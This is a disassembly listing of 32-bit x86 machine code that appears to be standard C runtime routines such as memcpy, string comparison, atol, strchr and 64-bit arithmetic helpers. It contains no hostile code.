  426a1f:	add    BYTE PTR [edx+ebp*2+0x42],al
  426a23:	add    BYTE PTR [edx+ebp*2+0x42],cl
  426a27:	add    BYTE PTR [edx+ebp*2+0x42],dl
  426a2b:	add    BYTE PTR [edx+ebp*2+0x42],bl
  426a2f:	add    BYTE PTR [edx+ebp*2+0x42],ah
  426a33:	add    BYTE PTR [edx+ebp*2+0x42],ch
  426a37:	add    BYTE PTR [edi+0x6a],bh
  426a3a:	inc    edx
  426a3b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a41:	inc    esp
  426a42:	(bad)  
  426a43:	sbb    al,0x8b
  426a45:	inc    esp
  426a46:	mov    ds,WORD PTR [eax]
  426a48:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a4c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426a50:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426a54:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426a58:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426a5c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426a60:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426a64:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426a68:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426a6c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426a70:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426a74:	lea    eax,[ecx*4+0x0]
  426a7b:	add    esi,eax
  426a7d:	add    edi,eax
  426a7f:	jmp    DWORD PTR [edx*4+0x426a88]
  426a86:	mov    edi,edi
  426a88:	cwde   
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [eax-0x4fffbd96],ah
  426a91:	push   0x42
  426a93:	add    ah,al
  426a95:	push   0x42
  426a97:	add    BYTE PTR [ebx+0x5f5e0845],cl
  426a9d:	leave  
  426a9e:	ret    
  426a9f:	nop
  426aa0:	mov    al,BYTE PTR [esi+0x3]
  426aa3:	mov    BYTE PTR [edi+0x3],al
  426aa6:	mov    eax,DWORD PTR [ebp+0x8]
  426aa9:	pop    esi
  426aaa:	pop    edi
  426aab:	leave  
  426aac:	ret    
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
  426ab3:	mov    BYTE PTR [edi+0x3],al
  426ab6:	mov    al,BYTE PTR [esi+0x2]
  426ab9:	mov    BYTE PTR [edi+0x2],al
  426abc:	mov    eax,DWORD PTR [ebp+0x8]
  426abf:	pop    esi
  426ac0:	pop    edi
  426ac1:	leave  
  426ac2:	ret    
  426ac3:	nop
  426ac4:	mov    al,BYTE PTR [esi+0x3]
  426ac7:	mov    BYTE PTR [edi+0x3],al
  426aca:	mov    al,BYTE PTR [esi+0x2]
  426acd:	mov    BYTE PTR [edi+0x2],al
  426ad0:	mov    al,BYTE PTR [esi+0x1]
  426ad3:	mov    BYTE PTR [edi+0x1],al
  426ad6:	mov    eax,DWORD PTR [ebp+0x8]
  426ad9:	pop    esi
  426ada:	pop    edi
  426adb:	leave  
  426adc:	ret    
  426add:	push   ebp
  426ade:	mov    ebp,esp
  426ae0:	sub    esp,0xc
  426ae3:	mov    eax,ds:0x45c430
  426ae8:	xor    eax,DWORD PTR [ebp+0x4]
  426aeb:	and    BYTE PTR [ebp-0x6],0x0
  426aef:	push   0x6
  426af1:	mov    DWORD PTR [ebp-0x4],eax
  426af4:	lea    eax,[ebp-0xc]
  426af7:	push   eax
  426af8:	push   0x1004
  426afd:	push   DWORD PTR [ebp+0x8]
  426b00:	call   DWORD PTR ds:0x4280dc
  426b06:	test   eax,eax
  426b08:	jne    0x426b0f
  426b0a:	or     eax,0xffffffff
  426b0d:	jmp    0x426b19
  426b0f:	lea    eax,[ebp-0xc]
  426b12:	push   eax
  426b13:	call   0x426e1e
  426b18:	pop    ecx
  426b19:	mov    ecx,DWORD PTR [ebp-0x4]
  426b1c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b1f:	call   0x423f2c
  426b24:	leave  
  426b25:	ret    
  426b26:	push   0x38
  426b28:	push   0x428ea8
  426b2d:	call   0x423858
  426b32:	mov    eax,ds:0x45c430
  426b37:	xor    eax,DWORD PTR [ebp+0x4]
  426b3a:	mov    DWORD PTR [ebp-0x1c],eax
  426b3d:	xor    edi,edi
  426b3f:	mov    DWORD PTR [ebp-0x20],edi
  426b42:	mov    DWORD PTR [ebp-0x24],edi
  426b45:	mov    eax,DWORD PTR [ebp+0x14]
  426b48:	mov    ebx,DWORD PTR [eax]
  426b4a:	mov    DWORD PTR [ebp-0x28],ebx
  426b4d:	mov    DWORD PTR [ebp-0x2c],edi
  426b50:	mov    eax,DWORD PTR [ebp+0x8]
  426b53:	cmp    eax,DWORD PTR [ebp+0xc]
  426b56:	je     0x426ccf
  426b5c:	lea    ecx,[ebp-0x40]
  426b5f:	push   ecx
  426b60:	push   eax
  426b61:	mov    esi,DWORD PTR ds:0x4280a0
  426b67:	call   esi
  426b69:	test   eax,eax
  426b6b:	je     0x426b8d
  426b6d:	cmp    DWORD PTR [ebp-0x40],0x1
  426b71:	jne    0x426b8d
  426b73:	lea    eax,[ebp-0x40]
  426b76:	push   eax
  426b77:	push   DWORD PTR [ebp+0xc]
  426b7a:	call   esi
  426b7c:	test   eax,eax
  426b7e:	je     0x426b8d
  426b80:	cmp    DWORD PTR [ebp-0x40],0x1
  426b84:	jne    0x426b8d
  426b86:	mov    DWORD PTR [ebp-0x2c],0x1
  426b8d:	cmp    DWORD PTR [ebp-0x2c],edi
  426b90:	je     0x426bac
  426b92:	cmp    ebx,0xffffffff
  426b95:	je     0x426b9b
  426b97:	mov    esi,ebx
  426b99:	jmp    0x426ba7
  426b9b:	push   DWORD PTR [ebp+0x10]
  426b9e:	call   0x423e70
  426ba3:	pop    ecx
  426ba4:	mov    esi,eax
  426ba6:	inc    esi
  426ba7:	mov    DWORD PTR [ebp-0x44],esi
  426baa:	jmp    0x426baf
  426bac:	mov    esi,DWORD PTR [ebp-0x44]
  426baf:	cmp    DWORD PTR [ebp-0x2c],edi
  426bb2:	jne    0x426bce
  426bb4:	push   edi
  426bb5:	push   edi
  426bb6:	push   ebx
  426bb7:	push   DWORD PTR [ebp+0x10]
  426bba:	push   0x1
  426bbc:	push   DWORD PTR [ebp+0x8]
  426bbf:	call   DWORD PTR ds:0x4280cc
  426bc5:	mov    esi,eax
  426bc7:	mov    DWORD PTR [ebp-0x44],esi
  426bca:	cmp    esi,edi
  426bcc:	je     0x426c26
  426bce:	mov    DWORD PTR [ebp-0x4],edi
  426bd1:	lea    eax,[esi+esi*1]
  426bd4:	add    eax,0x3
  426bd7:	and    eax,0xfffffffc
  426bda:	call   0x4238b0
  426bdf:	mov    DWORD PTR [ebp-0x18],esp
  426be2:	mov    ebx,esp
  426be4:	mov    DWORD PTR [ebp-0x48],ebx
  426be7:	lea    eax,[esi+esi*1]
  426bea:	push   eax
  426beb:	push   edi
  426bec:	push   ebx
  426bed:	call   0x426160
  426bf2:	add    esp,0xc
  426bf5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426bf9:	jmp    0x426c12
  426bfb:	xor    eax,eax
  426bfd:	inc    eax
  426bfe:	ret    
  426bff:	mov    esp,DWORD PTR [ebp-0x18]
  426c02:	call   0x426cf5
  426c07:	xor    edi,edi
  426c09:	xor    ebx,ebx
  426c0b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c0f:	mov    esi,DWORD PTR [ebp-0x44]
  426c12:	cmp    ebx,edi
  426c14:	jne    0x426c34
  426c16:	push   esi
  426c17:	push   0x2
  426c19:	call   0x424978
  426c1e:	pop    ecx
  426c1f:	pop    ecx
  426c20:	mov    ebx,eax
  426c22:	cmp    ebx,edi
  426c24:	jne    0x426c2d
  426c26:	xor    eax,eax
  426c28:	jmp    0x426ce1
  426c2d:	mov    DWORD PTR [ebp-0x24],0x1
  426c34:	push   esi
  426c35:	push   ebx
  426c36:	push   DWORD PTR [ebp-0x28]
  426c39:	push   DWORD PTR [ebp+0x10]
  426c3c:	push   0x1
  426c3e:	push   DWORD PTR [ebp+0x8]
  426c41:	call   DWORD PTR ds:0x4280cc
  426c47:	test   eax,eax
  426c49:	je     0x426cd2
  426c4f:	cmp    DWORD PTR [ebp+0x18],edi
  426c52:	je     0x426c74
  426c54:	push   edi
  426c55:	push   edi
  426c56:	push   DWORD PTR [ebp+0x1c]
  426c59:	push   DWORD PTR [ebp+0x18]
  426c5c:	push   esi
  426c5d:	push   ebx
  426c5e:	push   edi
  426c5f:	push   DWORD PTR [ebp+0xc]
  426c62:	call   DWORD PTR ds:0x428050
  426c68:	test   eax,eax
  426c6a:	je     0x426cd2
  426c6c:	mov    eax,DWORD PTR [ebp+0x18]
  426c6f:	mov    DWORD PTR [ebp-0x20],eax
  426c72:	jmp    0x426cd2
  426c74:	cmp    DWORD PTR [ebp-0x2c],edi
  426c77:	jne    0x426c8f
  426c79:	push   edi
  426c7a:	push   edi
  426c7b:	push   edi
  426c7c:	push   edi
  426c7d:	push   esi
  426c7e:	push   ebx
  426c7f:	push   edi
  426c80:	push   DWORD PTR [ebp+0xc]
  426c83:	call   DWORD PTR ds:0x428050
  426c89:	mov    esi,eax
  426c8b:	cmp    esi,edi
  426c8d:	je     0x426cd2
  426c8f:	push   esi
  426c90:	push   0x1
  426c92:	call   0x424978
  426c97:	pop    ecx
  426c98:	pop    ecx
  426c99:	mov    DWORD PTR [ebp-0x20],eax
  426c9c:	cmp    eax,edi
  426c9e:	je     0x426cd2
  426ca0:	push   edi
  426ca1:	push   edi
  426ca2:	push   esi
  426ca3:	push   eax
  426ca4:	push   esi
  426ca5:	push   ebx
  426ca6:	push   edi
  426ca7:	push   DWORD PTR [ebp+0xc]
  426caa:	call   DWORD PTR ds:0x428050
  426cb0:	cmp    eax,edi
  426cb2:	jne    0x426cc2
  426cb4:	push   DWORD PTR [ebp-0x20]
  426cb7:	call   0x42446a
  426cbc:	pop    ecx
  426cbd:	mov    DWORD PTR [ebp-0x20],edi
  426cc0:	jmp    0x426cd2
  426cc2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426cc6:	je     0x426cd2
  426cc8:	mov    ecx,DWORD PTR [ebp+0x14]
  426ccb:	mov    DWORD PTR [ecx],eax
  426ccd:	jmp    0x426cd2
  426ccf:	mov    ebx,DWORD PTR [ebp-0x48]
  426cd2:	cmp    DWORD PTR [ebp-0x24],edi
  426cd5:	je     0x426cde
  426cd7:	push   ebx
  426cd8:	call   0x42446a
  426cdd:	pop    ecx
  426cde:	mov    eax,DWORD PTR [ebp-0x20]
  426ce1:	lea    esp,[ebp-0x54]
  426ce4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426ce7:	xor    ecx,DWORD PTR [ebp+0x4]
  426cea:	call   0x423f2c
  426cef:	call   0x423893
  426cf4:	ret    
  426cf5:	push   ebp
  426cf6:	mov    ebp,esp
  426cf8:	sub    esp,0x48
  426cfb:	push   ebx
  426cfc:	push   esi
  426cfd:	push   edi
  426cfe:	push   0x4
  426d00:	pop    eax
  426d01:	call   0x4238b0
  426d06:	mov    ebx,esp
  426d08:	push   0x1c
  426d0a:	lea    eax,[ebp-0x24]
  426d0d:	push   eax
  426d0e:	push   ebx
  426d0f:	call   DWORD PTR ds:0x4280e8
  426d15:	test   eax,eax
  426d17:	je     0x426d8a
  426d19:	mov    edi,DWORD PTR [ebp-0x20]
  426d1c:	lea    eax,[ebp-0x48]
  426d1f:	push   eax
  426d20:	call   DWORD PTR ds:0x4280e4
  426d26:	mov    eax,DWORD PTR [ebp-0x44]
  426d29:	lea    esi,[eax-0x1]
  426d2c:	not    esi
  426d2e:	and    esi,ebx
  426d30:	sub    esi,eax
  426d32:	mov    DWORD PTR [ebp-0x4],eax
  426d35:	mov    eax,ds:0x45cac4
  426d3a:	mov    ecx,eax
  426d3c:	dec    ecx
  426d3d:	neg    ecx
  426d3f:	sbb    ecx,ecx
  426d41:	and    ecx,0xffff1000
  426d47:	add    ecx,0x11000
  426d4d:	add    ecx,edi
  426d4f:	cmp    esi,ecx
  426d51:	jb     0x426d8a
  426d53:	cmp    eax,0x1
  426d56:	je     0x426da2
  426d58:	mov    ebx,edi
  426d5a:	mov    edi,0x1000
  426d5f:	push   0x1c
  426d61:	lea    eax,[ebp-0x24]
  426d64:	push   eax
  426d65:	push   ebx
  426d66:	call   DWORD PTR ds:0x4280e8
  426d6c:	test   eax,eax
  426d6e:	je     0x426d8a
  426d70:	add    ebx,DWORD PTR [ebp-0x18]
  426d73:	test   DWORD PTR [ebp-0x14],edi
  426d76:	je     0x426d5f
  426d78:	test   BYTE PTR [ebp-0xf],0x1
  426d7c:	mov    ebx,DWORD PTR [ebp-0x24]
  426d7f:	je     0x426d86
  426d81:	xor    eax,eax
  426d83:	inc    eax
  426d84:	jmp    0x426dbe
  426d86:	cmp    esi,ebx
  426d88:	jae    0x426d8e
  426d8a:	xor    eax,eax
  426d8c:	jmp    0x426dbe
  426d8e:	push   0x4
  426d90:	push   edi
  426d91:	push   DWORD PTR [ebp-0x4]
  426d94:	push   ebx
  426d95:	call   DWORD PTR ds:0x4280ac
  426d9b:	mov    eax,ds:0x45cac4
  426da0:	jmp    0x426da4
  426da2:	mov    ebx,esi
  426da4:	dec    eax
  426da5:	neg    eax
  426da7:	sbb    eax,eax
  426da9:	and    eax,0x103
  426dae:	lea    ecx,[ebp-0x8]
  426db1:	push   ecx
  426db2:	inc    eax
  426db3:	push   eax
  426db4:	push   DWORD PTR [ebp-0x4]
  426db7:	push   ebx
  426db8:	call   DWORD PTR ds:0x428008
  426dbe:	lea    esp,[ebp-0x54]
  426dc1:	pop    edi
  426dc2:	pop    esi
  426dc3:	pop    ebx
  426dc4:	leave  
  426dc5:	ret    
  426dc6:	int3   
  426dc7:	int3   
  426dc8:	int3   
  426dc9:	int3   
  426dca:	int3   
  426dcb:	int3   
  426dcc:	int3   
  426dcd:	int3   
  426dce:	int3   
  426dcf:	int3   
  426dd0:	push   ebp
  426dd1:	mov    ebp,esp
  426dd3:	push   edi
  426dd4:	push   esi
  426dd5:	push   ebx
  426dd6:	mov    esi,DWORD PTR [ebp+0xc]
  426dd9:	mov    edi,DWORD PTR [ebp+0x8]
  426ddc:	mov    al,0xff
  426dde:	mov    edi,edi
  426de0:	or     al,al
  426de2:	je     0x426e16
  426de4:	mov    al,BYTE PTR [esi]
  426de6:	add    esi,0x1
  426de9:	mov    ah,BYTE PTR [edi]
  426deb:	add    edi,0x1
  426dee:	cmp    ah,al
  426df0:	je     0x426de0
  426df2:	sub    al,0x41
  426df4:	cmp    al,0x1a
  426df6:	sbb    cl,cl
  426df8:	and    cl,0x20
  426dfb:	add    al,cl
  426dfd:	add    al,0x41
  426dff:	xchg   al,ah
  426e01:	sub    al,0x41
  426e03:	cmp    al,0x1a
  426e05:	sbb    cl,cl
  426e07:	and    cl,0x20
  426e0a:	add    al,cl
  426e0c:	add    al,0x41
  426e0e:	cmp    al,ah
  426e10:	je     0x426de0
  426e12:	sbb    al,al
  426e14:	sbb    al,0xff
  426e16:	movsx  eax,al
  426e19:	pop    ebx
  426e1a:	pop    esi
  426e1b:	pop    edi
  426e1c:	leave  
  426e1d:	ret    
  426e1e:	push   esi
  426e1f:	push   edi
  426e20:	call   0x42370d
  426e25:	mov    edi,DWORD PTR [eax+0x64]
  426e28:	cmp    edi,DWORD PTR ds:0x45c58c
  426e2e:	je     0x426e37
  426e30:	call   0x424bbf
  426e35:	mov    edi,eax
  426e37:	mov    esi,DWORD PTR [esp+0xc]
  426e3b:	cmp    DWORD PTR [edi+0x28],0x1
  426e3f:	movzx  eax,BYTE PTR [esi]
  426e42:	jle    0x426e52
  426e44:	push   0x8
  426e46:	push   eax
  426e47:	push   edi
  426e48:	call   0x426ea6
  426e4d:	add    esp,0xc
  426e50:	jmp    0x426e5c
  426e52:	mov    ecx,DWORD PTR [edi+0x48]
  426e55:	movzx  eax,BYTE PTR [ecx+eax*2]
  426e59:	and    eax,0x8
  426e5c:	test   eax,eax
  426e5e:	je     0x426e63
  426e60:	inc    esi
  426e61:	jmp    0x426e3b
  426e63:	movzx  ecx,BYTE PTR [esi]
  426e66:	inc    esi
  426e67:	cmp    ecx,0x2d
  426e6a:	mov    edx,ecx
  426e6c:	je     0x426e73
  426e6e:	cmp    ecx,0x2b
  426e71:	jne    0x426e77
  426e73:	movzx  ecx,BYTE PTR [esi]
  426e76:	inc    esi
  426e77:	xor    eax,eax
  426e79:	cmp    ecx,0x30
  426e7c:	jl     0x426e88
  426e7e:	cmp    ecx,0x39
  426e81:	jg     0x426e88
  426e83:	sub    ecx,0x30
  426e86:	jmp    0x426e8b
  426e88:	or     ecx,0xffffffff
  426e8b:	cmp    ecx,0xffffffff
  426e8e:	je     0x426e9c
  426e90:	lea    eax,[eax+eax*4]
  426e93:	lea    eax,[ecx+eax*2]
  426e96:	movzx  ecx,BYTE PTR [esi]
  426e99:	inc    esi
  426e9a:	jmp    0x426e79
  426e9c:	cmp    edx,0x2d
  426e9f:	pop    edi
  426ea0:	pop    esi
  426ea1:	jne    0x426ea5
  426ea3:	neg    eax
  426ea5:	ret    
  426ea6:	push   ebp
  426ea7:	mov    ebp,esp
  426ea9:	push   ecx
  426eaa:	mov    eax,DWORD PTR [ebp+0xc]
  426ead:	lea    ecx,[eax+0x1]
  426eb0:	cmp    ecx,0x100
  426eb6:	mov    ecx,DWORD PTR [ebp+0x8]
  426eb9:	ja     0x426ec4
  426ebb:	mov    ecx,DWORD PTR [ecx+0x48]
  426ebe:	movzx  eax,WORD PTR [ecx+eax*2]
  426ec2:	jmp    0x426f18
  426ec4:	push   esi
  426ec5:	mov    edx,eax
  426ec7:	sar    edx,0x8
  426eca:	push   edi
  426ecb:	mov    edi,DWORD PTR [ecx+0x48]
  426ece:	movzx  esi,dl
  426ed1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426ed6:	pop    edi
  426ed7:	pop    esi
  426ed8:	je     0x426ee9
  426eda:	and    BYTE PTR [ebp-0x2],0x0
  426ede:	push   0x2
  426ee0:	mov    BYTE PTR [ebp-0x3],al
  426ee3:	mov    BYTE PTR [ebp-0x4],dl
  426ee6:	pop    eax
  426ee7:	jmp    0x426ef3
  426ee9:	and    BYTE PTR [ebp-0x3],0x0
  426eed:	mov    BYTE PTR [ebp-0x4],al
  426ef0:	xor    eax,eax
  426ef2:	inc    eax
  426ef3:	push   0x1
  426ef5:	push   DWORD PTR [ecx+0x14]
  426ef8:	push   DWORD PTR [ecx+0x4]
  426efb:	lea    ecx,[ebp+0xe]
  426efe:	push   ecx
  426eff:	push   eax
  426f00:	lea    eax,[ebp-0x4]
  426f03:	push   eax
  426f04:	push   0x1
  426f06:	call   0x425f88
  426f0b:	add    esp,0x1c
  426f0e:	test   eax,eax
  426f10:	jne    0x426f14
  426f12:	leave  
  426f13:	ret    
  426f14:	movzx  eax,WORD PTR [ebp+0xe]
  426f18:	and    eax,DWORD PTR [ebp+0x10]
  426f1b:	leave  
  426f1c:	ret    
  426f1d:	int3   
  426f1e:	int3   
  426f1f:	int3   
  426f20:	mov    eax,DWORD PTR [esp+0x8]
  426f24:	mov    ecx,DWORD PTR [esp+0x10]
  426f28:	or     ecx,eax
  426f2a:	mov    ecx,DWORD PTR [esp+0xc]
  426f2e:	jne    0x426f39
  426f30:	mov    eax,DWORD PTR [esp+0x4]
  426f34:	mul    ecx
  426f36:	ret    0x10
  426f39:	push   ebx
  426f3a:	mul    ecx
  426f3c:	mov    ebx,eax
  426f3e:	mov    eax,DWORD PTR [esp+0x8]
  426f42:	mul    DWORD PTR [esp+0x14]
  426f46:	add    ebx,eax
  426f48:	mov    eax,DWORD PTR [esp+0x8]
  426f4c:	mul    ecx
  426f4e:	add    edx,ebx
  426f50:	pop    ebx
  426f51:	ret    0x10
  426f54:	int3   
  426f55:	int3   
  426f56:	int3   
  426f57:	int3   
  426f58:	int3   
  426f59:	int3   
  426f5a:	int3   
  426f5b:	int3   
  426f5c:	int3   
  426f5d:	int3   
  426f5e:	int3   
  426f5f:	int3   
  426f60:	push   ebp
  426f61:	mov    ebp,esp
  426f63:	push   edi
  426f64:	push   esi
  426f65:	push   ebx
  426f66:	mov    ecx,DWORD PTR [ebp+0x10]
  426f69:	or     ecx,ecx
  426f6b:	je     0x426fba
  426f6d:	mov    esi,DWORD PTR [ebp+0x8]
  426f70:	mov    edi,DWORD PTR [ebp+0xc]
  426f73:	mov    bh,0x41
  426f75:	mov    bl,0x5a
  426f77:	mov    dh,0x20
  426f79:	lea    ecx,[ecx+0x0]
  426f7c:	mov    ah,BYTE PTR [esi]
  426f7e:	or     ah,ah
  426f80:	mov    al,BYTE PTR [edi]
  426f82:	je     0x426fab
  426f84:	or     al,al
  426f86:	je     0x426fab
  426f88:	add    esi,0x1
  426f8b:	add    edi,0x1
  426f8e:	cmp    ah,bh
  426f90:	jb     0x426f98
  426f92:	cmp    ah,bl
  426f94:	ja     0x426f98
  426f96:	add    ah,dh
  426f98:	cmp    al,bh
  426f9a:	jb     0x426fa2
  426f9c:	cmp    al,bl
  426f9e:	ja     0x426fa2
  426fa0:	add    al,dh
  426fa2:	cmp    ah,al
  426fa4:	jne    0x426fb1
  426fa6:	sub    ecx,0x1
  426fa9:	jne    0x426f7c
  426fab:	xor    ecx,ecx
  426fad:	cmp    ah,al
  426faf:	je     0x426fba
  426fb1:	mov    ecx,0xffffffff
  426fb6:	jb     0x426fba
  426fb8:	neg    ecx
  426fba:	mov    eax,ecx
  426fbc:	pop    ebx
  426fbd:	pop    esi
  426fbe:	pop    edi
  426fbf:	leave  
  426fc0:	ret    
  426fc1:	int3   
  426fc2:	int3   
  426fc3:	int3   
  426fc4:	int3   
  426fc5:	int3   
  426fc6:	int3   
  426fc7:	int3   
  426fc8:	int3   
  426fc9:	int3   
  426fca:	int3   
  426fcb:	int3   
  426fcc:	int3   
  426fcd:	int3   
  426fce:	int3   
  426fcf:	int3   
  426fd0:	push   esi
  426fd1:	mov    eax,DWORD PTR [esp+0x14]
  426fd5:	or     eax,eax
  426fd7:	jne    0x427001
  426fd9:	mov    ecx,DWORD PTR [esp+0x10]
  426fdd:	mov    eax,DWORD PTR [esp+0xc]
  426fe1:	xor    edx,edx
  426fe3:	div    ecx
  426fe5:	mov    ebx,eax
  426fe7:	mov    eax,DWORD PTR [esp+0x8]
  426feb:	div    ecx
  426fed:	mov    esi,eax
  426fef:	mov    eax,ebx
  426ff1:	mul    DWORD PTR [esp+0x10]
  426ff5:	mov    ecx,eax
  426ff7:	mov    eax,esi
  426ff9:	mul    DWORD PTR [esp+0x10]
  426ffd:	add    edx,ecx
  426fff:	jmp    0x427048
  427001:	mov    ecx,eax
  427003:	mov    ebx,DWORD PTR [esp+0x10]
  427007:	mov    edx,DWORD PTR [esp+0xc]
  42700b:	mov    eax,DWORD PTR [esp+0x8]
  42700f:	shr    ecx,1
  427011:	rcr    ebx,1
  427013:	shr    edx,1
  427015:	rcr    eax,1
  427017:	or     ecx,ecx
  427019:	jne    0x42700f
  42701b:	div    ebx
  42701d:	mov    esi,eax
  42701f:	mul    DWORD PTR [esp+0x14]
  427023:	mov    ecx,eax
  427025:	mov    eax,DWORD PTR [esp+0x10]
  427029:	mul    esi
  42702b:	add    edx,ecx
  42702d:	jb     0x42703d
  42702f:	cmp    edx,DWORD PTR [esp+0xc]
  427033:	ja     0x42703d
  427035:	jb     0x427046
  427037:	cmp    eax,DWORD PTR [esp+0x8]
  42703b:	jbe    0x427046
  42703d:	dec    esi
  42703e:	sub    eax,DWORD PTR [esp+0x10]
  427042:	sbb    edx,DWORD PTR [esp+0x14]
  427046:	xor    ebx,ebx
  427048:	sub    eax,DWORD PTR [esp+0x8]
  42704c:	sbb    edx,DWORD PTR [esp+0xc]
  427050:	neg    edx
  427052:	neg    eax
  427054:	sbb    edx,0x0
  427057:	mov    ecx,edx
  427059:	mov    edx,ebx
  42705b:	mov    ebx,ecx
  42705d:	mov    ecx,eax
  42705f:	mov    eax,esi
  427061:	pop    esi
  427062:	ret    0x10
  427065:	int3   
  427066:	int3   
  427067:	int3   
  427068:	int3   
  427069:	int3   
  42706a:	int3   
  42706b:	int3   
  42706c:	int3   
  42706d:	int3   
  42706e:	int3   
  42706f:	int3   
  427070:	lea    eax,[edx-0x1]
  427073:	pop    ebx
  427074:	ret    
  427075:	lea    esp,[esp+0x0]
  42707c:	lea    esp,[esp+0x0]
  427080:	xor    eax,eax
  427082:	mov    al,BYTE PTR [esp+0x8]
  427086:	push   ebx
  427087:	mov    ebx,eax
  427089:	shl    eax,0x8
  42708c:	mov    edx,DWORD PTR [esp+0x8]
  427090:	test   edx,0x3
  427096:	je     0x4270ad
  427098:	mov    cl,BYTE PTR [edx]
  42709a:	add    edx,0x1
  42709d:	cmp    cl,bl
  42709f:	je     0x427070
  4270a1:	test   cl,cl
  4270a3:	je     0x4270f6
  4270a5:	test   edx,0x3
  4270ab:	jne    0x427098
  4270ad:	or     ebx,eax
  4270af:	push   edi
  4270b0:	mov    eax,ebx
  4270b2:	shl    ebx,0x10
  4270b5:	push   esi
  4270b6:	or     ebx,eax
  4270b8:	mov    ecx,DWORD PTR [edx]
  4270ba:	mov    edi,0x7efefeff
  4270bf:	mov    eax,ecx
  4270c1:	mov    esi,edi
  4270c3:	xor    ecx,ebx
  4270c5:	add    esi,eax
  4270c7:	add    edi,ecx
  4270c9:	xor    ecx,0xffffffff
  4270cc:	xor    eax,0xffffffff
  4270cf:	xor    ecx,edi
  4270d1:	xor    eax,esi
  4270d3:	add    edx,0x4
  4270d6:	and    ecx,0x81010100
  4270dc:	jne    0x4270fa
  4270de:	and    eax,0x81010100
  4270e3:	je     0x4270b8
  4270e5:	and    eax,0x1010100
  4270ea:	jne    0x4270f4
  4270ec:	and    esi,0x80000000
  4270f2:	jne    0x4270b8
  4270f4:	pop    esi
  4270f5:	pop    edi
  4270f6:	pop    ebx
  4270f7:	xor    eax,eax
  4270f9:	ret    
  4270fa:	mov    eax,DWORD PTR [edx-0x4]
  4270fd:	cmp    al,bl
  4270ff:	je     0x427137
  427101:	test   al,al
  427103:	je     0x4270f4
  427105:	cmp    ah,bl
  427107:	je     0x427130
  427109:	test   ah,ah
  42710b:	je     0x4270f4
  42710d:	shr    eax,0x10
  427110:	cmp    al,bl
  427112:	je     0x427129
  427114:	test   al,al
  427116:	je     0x4270f4
  427118:	cmp    ah,bl
  42711a:	je     0x427122
  42711c:	test   ah,ah
  42711e:	je     0x4270f4
  427120:	jmp    0x4270b8
  427122:	pop    esi
  427123:	pop    edi
  427124:	lea    eax,[edx-0x1]
  427127:	pop    ebx
  427128:	ret    
  427129:	lea    eax,[edx-0x2]
  42712c:	pop    esi
  42712d:	pop    edi
  42712e:	pop    ebx
  42712f:	ret    
  427130:	lea    eax,[edx-0x3]
  427133:	pop    esi
  427134:	pop    edi
  427135:	pop    ebx
  427136:	ret    
  427137:	lea    eax,[edx-0x4]
  42713a:	pop    esi
  42713b:	pop    edi
  42713c:	pop    ebx
  42713d:	ret    
  42713e:	jmp    DWORD PTR ds:0x4280e0
